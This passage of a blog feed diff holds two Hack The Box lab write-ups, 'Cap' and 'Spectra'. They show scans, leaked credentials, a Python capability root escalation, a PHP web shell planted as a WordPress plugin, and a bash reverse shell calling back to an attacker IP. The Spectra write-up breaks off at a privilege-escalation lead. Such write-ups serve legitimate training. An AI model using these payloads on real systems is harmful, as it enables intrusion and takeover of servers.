+<p><img src="/img/cap/Pasted_image_20210717190340.png" alt="/img/cap/Pasted_image_20210717190340.png"></p>
+</li>
+</ul>
+<p>We get FTP id and password</p>
+<pre><code>nathan:Buck3tH4TF0RM3!
+</code></pre><h1 id="exploitation">Exploitation</h1>
+<h2 id="getting-shell">Getting shell</h2>
+<p>Using these credentials to login in using SSH, we get a shell</p>
+<p><img src="/img/cap/Pasted_image_20210717190453.png" alt="/img/cap/Pasted_image_20210717190453.png"></p>
+<h1 id="post-exploit-enumeration---user-level">Post Exploit Enumeration - User level</h1>
+<p><img src="/img/cap/Pasted_image_20210721202213.png" alt="/img/cap/Pasted_image_20210721202213.png"></p>
+<p>Linux Capabilities: <em>Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.</em></p>
+<p>Further Reading → <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></p>
+<h1 id="exploitation-1">Exploitation</h1>
+<pre><code>python3.8 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;);'
+</code></pre><p><img src="/img/cap/Pasted_image_20210722000148.png" alt="/img/cap/Pasted_image_20210722000148.png"></p>
+<p><img src="/img/cap/Pasted_image_20210722000201.png" alt="/img/cap/Pasted_image_20210722000201.png"></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB Spectra - Writeup</title>
+            <link>https://harshitm98.github.io/posts/htb-machine-spectra/</link>
+            <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://harshitm98.github.io/posts/htb-machine-spectra/</guid>
+            <description>Enumeration Nmap Scans Service Scan # Nmap 7.91 scan initiated Fri Jun 11 23:59:16 2021 as: nmap -T4 -A -p22,80,3306 -oA nmap/service-scan -Pn 10.10.10.229 Nmap scan report for 10.10.10.229 Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn&#39;t have a title (text/html). 3306/tcp open mysql? |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) Service detection performed.</description>
+            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap-scans">Nmap Scans</h2>
+<h3 id="service-scan">Service Scan</h3>
+<pre><code># Nmap 7.91 scan initiated Fri Jun 11 23:59:16 2021 as: nmap -T4 -A -p22,80,3306 -oA nmap/service-scan -Pn 10.10.10.229
+Nmap scan report for 10.10.10.229
+Host is up (0.068s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey:
+|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
+80/tcp   open  http    nginx 1.17.4
+|_http-server-header: nginx/1.17.4
+|_http-title: Site doesn't have a title (text/html).
+3306/tcp open  mysql?
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
+# Nmap done at Sat Jun 12 00:01:05 2021 -- 1 IP address (1 host up) scanned in 109.31 seconds
+
+</code></pre><p><strong>Summary</strong></p>
+<ul>
+<li>Ports opened -&gt; 22, 80, 3306</li>
+</ul>
+<h2 id="enumeration-port-80">Enumeration: Port 80</h2>
+<p>Landing page:</p>
+<p><img src="/img/spectra/Pasted_image_20210612000503.png" alt="/img/spectra/Pasted_image_20210612000503.png"></p>
+<p>Source code:</p>
+<p><img src="/img/spectra/Pasted_image_20210612000522.png" alt="/img/spectra/Pasted_image_20210612000522.png"></p>
+<p>This uses <code>http://spectra.htb/</code> instead of the IP, so we modify in our <code>/etc/hosts</code> file as well</p>
+<pre><code>$ cat /etc/hosts | grep spectra.htb
+10.10.10.229    spectra.htb
+</code></pre><h3 id="main">/main</h3>
+<p>Landing page</p>
+<p><img src="/img/spectra/Pasted_image_20210612000654.png" alt="/img/spectra/Pasted_image_20210612000654.png"></p>
+<p>It&rsquo;s a wordpress site.</p>
+<ul>
+<li>wpscan does not reveal anything interesting.</li>
+</ul>
+<h3 id="testing">/testing</h3>
+<ul>
+<li>Error establishing database connection</li>
+</ul>
+<p>Running ffuf</p>
+<pre><code>$ ffuf -u &lt;http://spectra.htb/testing/FUZZ&gt; -w /usr/share/wordlists/dirb/common.txt -r -v -c -ic -e .php,.txt -of html -o http/http-80-common-testing.html
+
+       v1.3.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : &lt;http://spectra.htb/testing/FUZZ&gt;
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .php .txt
+ :: Output file      : http/http-80-common-testing.html
+ :: File format      : html
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+[Status: 200, Size: 2514, Words: 1130, Lines: 27]
+| URL | &lt;http://spectra.htb/testing/&gt;
+    * FUZZ:
+
+[Status: 200, Size: 19915, Words: 3331, Lines: 385]
+| URL | &lt;http://spectra.htb/testing/license.txt&gt;
+    * FUZZ: license.txt
+
+[Status: 200, Size: 11460, Words: 5252, Lines: 102]
+| URL | &lt;http://spectra.htb/testing/wp-admin&gt;
+    * FUZZ: wp-admin
+
+[Status: 200, Size: 627, Words: 259, Lines: 11]
+| URL | &lt;http://spectra.htb/testing/wp-content&gt;
+    * FUZZ: wp-content
+
+[Status: 200, Size: 585, Words: 50, Lines: 7]
+| URL | &lt;http://spectra.htb/testing/wp-settings.php&gt;
+    * FUZZ: wp-settings.php
+
+[Status: 200, Size: 25891, Words: 10424, Lines: 215]
+| URL | &lt;http://spectra.htb/testing/wp-includes&gt;
+    * FUZZ: wp-includes
+
+[Status: 200, Size: 0, Words: 1, Lines: 1]
+| URL | &lt;http://spectra.htb/testing/xmlrpc.php&gt;
+    * FUZZ: xmlrpc.php
+
+[Status: 200, Size: 0, Words: 1, Lines: 1]
+| URL | &lt;http://spectra.htb/testing/xmlrpc.php&gt;
+    * FUZZ: xmlrpc.php
+
+:: Progress: [13842/13842] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:45] :: Errors: 0 ::
+
+</code></pre><ul>
+<li>
+<p>Going to <code>/testing/wp-admin</code> displays all the files in that directory. Perhaps, directory listing is turned on.</p>
+<p><img src="/img/spectra/Pasted_image_20210617193018.png" alt="/img/spectra/Pasted_image_20210617193018.png"></p>
+</li>
+<li>
+<p>Instead of going to <code>/testing/index.php</code> -&gt; <code>/testing/</code> gives us all the files there.</p>
+<p><img src="/img/spectra/Pasted_image_20210617193216.png" alt="/img/spectra/Pasted_image_20210617193216.png"></p>
+</li>
+</ul>
+<p>==Should try <em>.php.save</em> during directory brute forcing as well==</p>
+<p>Seeing the source code of <code>wp-config.php.save</code> gives DB credentials</p>
+<p><img src="/img/spectra/Pasted_image_20210617193453.png" alt="/img/spectra/Pasted_image_20210617193453.png"></p>
+<pre><code>define( 'DB_NAME', 'dev' );
+/** MySQL database username */
+define( 'DB_USER', 'devtest' );
+/** MySQL database password */
+define( 'DB_PASSWORD', 'devteam01' );
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+</code></pre><p>Using this credentials to login as <code>administrator</code> on <code>http://spectra.htb/main/wp-admin/login.php</code> and we are in.</p>
+<p><img src="/img/spectra/Pasted_image_20210617193948.png" alt="/img/spectra/Pasted_image_20210617193948.png"></p>
+<p>Going to theme editor and updating 404.php</p>
+<p><img src="/img/spectra/Pasted_image_20210617194207.png" alt="/img/spectra/Pasted_image_20210617194207.png"></p>
+<p>Error:</p>
+<p><img src="/img/spectra/Pasted_image_20210617194410.png" alt="/img/spectra/Pasted_image_20210617194410.png"></p>
+<h3 id="getting-shell-by-uploading-plugin">Getting shell by uploading plugin</h3>
+<pre><code>┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
+└─$ cat rev.php
+&lt;?php
+
+/**
+ * Plugin Name: Wordpress Reverse Shell
+ * Author: fake_batman_
+ */
+    system($_REQUEST['cmd']);
+
+?&gt;
+┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
+└─$ zip rev.zip rev.php
+updating: rev.php (deflated 3%
+</code></pre><p><img src="/img/spectra/Pasted_image_20210617203800.png" alt="/img/spectra/Pasted_image_20210617203800.png"></p>
+<p>Upload the plugin.</p>
+<p>Go to <code>view-source:&lt;http://spectra.htb/main/wp-content/plugins/rev/rev.php?cmd=id&gt;</code></p>
+<p>And we get RCE</p>
+<p><img src="/img/spectra/Pasted_image_20210617204606.png" alt="/img/spectra/Pasted_image_20210617204606.png"></p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.10.14.28/4444 0&gt;&amp;1
+
+</code></pre><h1 id="escalating-to-user">Escalating to user</h1>
+<p><img src="/img/spectra/Pasted_image_20210617213606.png" alt="/img/spectra/Pasted_image_20210617213606.png"></p>
+<p><img src="/img/spectra/Pasted_image_20210617213634.png" alt="/img/spectra/Pasted_image_20210617213634.png"></p>
+<p><img src="/img/spectra/Pasted_image_20210617213655.png" alt="/img/spectra/Pasted_image_20210617213655.png"></p>
+<p>The password <code>SummerHereWeCome!!</code> works for katie. Hehe!</p>
+<pre><code>┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
+└─$ ssh katie@spectra.htb
+Password:
+katie@spectra ~ $ ls
+log  user.txt
+katie@spectra ~ $ cat user.txt
+e89d27fe195e911*****************
+</code></pre><h2 id="escalating-to-the-root">Escalating to the root</h2>
+<p>We are use <code>katie</code> and need to get root.</p>
+<h3 id="sudo--l-output"><code>sudo -l</code> output</h3>
+<pre><code>katie@spectra /dev/shm $ sudo -l
+User katie may run the following commands on spectra:
+    (ALL) SETENV: NOPASSWD: /sbin/initctl
+
+</code></pre><p>Getting to root -&gt; <a href="https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9">https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9</a></p>
+<h3 id="linpeassh-interesting-screenshots">linpeas.sh interesting screenshots</h3>
+<p><img src="/img/spectra/Pasted_image_20210618001207.png" alt="/img/spectra/Pasted_image_20210618001207.png"></p>
+<p>katie is in group <code>developers</code></p>
+<p><img src="/img/spectra/Pasted_image_20210618001309.png" alt="/img/spectra/Pasted_image_20210618001309.png"></p>
 ]]></content>
         </item>
         
